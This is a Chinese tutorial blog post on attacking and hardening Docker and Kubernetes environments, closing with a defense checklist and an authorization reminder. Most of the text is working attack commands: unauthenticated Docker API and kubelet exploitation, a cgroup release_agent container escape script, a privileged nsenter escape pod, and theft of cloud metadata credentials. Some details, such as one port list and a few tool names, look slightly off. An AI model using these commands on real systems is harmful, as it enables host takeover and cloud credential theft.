---
title: 云安全渗透测试：Docker 与 Kubernetes 攻防实战
slug: kali-云安全渗透测试-p5q6r
date: 2026-09-30
visibility: public
tags: Kali Linux, 云安全, Docker, Kubernetes, 容器安全, 渗透测试, 教程
---

# 云安全渗透测试：Docker 与 Kubernetes 攻防实战

> 企业上云已成主流，**容器与 K8s 也成为攻击者的新目标**。本文聚焦云原生环境中最高频的攻防场景：容器逃逸、K8s 配置错误、Service Account 滥用等，用 Kali 实战演练。

## 一、云原生攻击面概览

```
攻击面
├─ 应用层：Web 漏洞（未授权 API / SSRF）
├─ 容器层：镜像漏洞、配置错误、逃逸
├─ 编排层：K8s API 暴露 / RBAC 配置不当
├─ 服务网格：Istio / Sidecar 攻击
└─ 云平台：IAM 权限 / 元数据服务
```

### 关键概念

| 概念 | 说明 |
|------|------|
| Docker | 容器运行时 |
| K8s | 容器编排平台（Pod/Node/Namespace） |
| ServiceAccount | Pod 内的 API 身份 |
| 云元数据服务 | 169.254.169.254（拿云凭证） |

## 二、Docker 渗透

### 1. 宿主机端口探测

```bash
nmap -sV -p 2375,2376,2377, 10250,10255,6443 target
```

### 2. Docker API 未授权访问

```bash
# 探测（2375 暴露且未鉴权）
curl http://target:2375/version

# 未授权则直接拉镜像运行容器
docker -H tcp://target:2375 ps
docker -H tcp://target:2375 run -it --privileged ubuntu bash
```

> 高危：如果容器以 `--privileged` 运行，可以挂载宿主机根目录直接逃逸。

### 3. 容器内信息收集

```bash
# 看能否访问宿主机 Docker socket
ls -la /var/run/docker.sock
find / -name docker.sock 2>/dev/null

# 查看环境变量（可能泄露凭据）
env | grep -iE "key|secret|token"
```

### 4. 容器逃逸（cgroup + unshare）

```bash
# 特权容器逃逸：利用 release_agent
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\)/\1/p' /etc/mtab)
echo $host_path/cmd > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/passwd > $host_path/output" >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
sleep 2
cat /output
```

> 经典 CVE-2022-0492 cgroup 逃逸。**仅限授权靶场**（如 nucu-escape 靶场）练习。

## 三、Kubernetes 渗透

### 1. 发现 K8s API 服务器

```bash
nmap -sV -p 6443,10250,10255,2379 target
# 6443 = API Server，10250 = kubelet
# 默认匿名访问可能打开
```

### 2. 匿名访问测试

```bash
curl -k https://target:6443/api/v1/namespaces
# 匿名请求被拒？尝试伪造
curl -k -H "Authorization: Bearer $(xxx)" https://target:6443/api
```

### 3. kubelet 未授权（10250）

```bash
# 列出 Pod（10250 端口常见未鉴权）
curl -k https://target:10250/pods
# 若允许匿名，直接任意容器 exec
curl -k -X POST https://target:10250/run/<ns>/<pod>/<container> \
     -d "cmd=id"
```

### 4. 从容器到集群

```
1. 拿到 Pod shell
2. 读取 /var/run/secrets/kubernetes.io/serviceaccount/token
   （Service Account 令牌）
3. 用令牌访问 API → 提权到集群权限
4. 创建特权 Pod → 逃逸到 Node
```

### 5. 恶意 Pod 创建

```yaml
# 尝试创建特权 Pod（若 RBAC 允许）
apiVersion: v1
kind: Pod
metadata:
  name: evil-pod
spec:
  hostNetwork: true
  hostPID: true
  containers:
  - name: evil
    image: ubuntu
    command: ["/bin/sh","-c","nsenter -t 1 -m -u -i -n sh"]
    securityContext:
      privileged: true
```

```bash
kubectl apply -f evil.yaml   # 若有 kubectl 权限
```

## 四、云元数据服务（169.254.169.254）

```bash
# SSRF 或容器内访问云元数据
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# 拿到云凭证 → 直接接管云资源
```

## 五、Kali 云渗透工具

| 工具 | 用途 |
|------|------|
| kubectl | K8s API 交互 |
| kube-hunter | 自动化 K8s 侦察 |
| nginx-scan | 容器/逃逸检测 |
| Peirates | 云原生渗透框架 |
| kubesploit | K8s 后渗透 |
| pacu | AWS 云渗透框架 |
| scoutsuite | 云配置审计 |

## 六、防御加固清单

```
1. 禁止 Docker socket 对外暴露（2375）
2. K8s 开启 RBAC + 匿名禁用
3. kubelet --read-only-port 0 关闭
4. 镜像最小化、不跑 privileged
5. 元数据服务开启 IMDSv2 + 令牌
6. 网络策略（Cilium）微隔离
7. 密钥用 Vault / KMS 管理
```

## 安全合规

> 云环境渗透测试涉及**生产环境风险**，必须在授权与**书面方案**下进行，测试前备份数据、限制影响范围。

## 小结

- Docker 的攻击核心：API 暴露 + 特权容器 + 逃逸
- K8s 攻击核心：RBAC 配置错误 + kubelet 未授权 + ServiceAccount
- 云元数据服务是"云上密码保险箱"
- kubectl 与 K8s 的配置即攻击面
- 上云不等于安全，配置错误才是最大漏洞

> 下一篇：Android 移动应用安全测试——从静态分析到动态调试。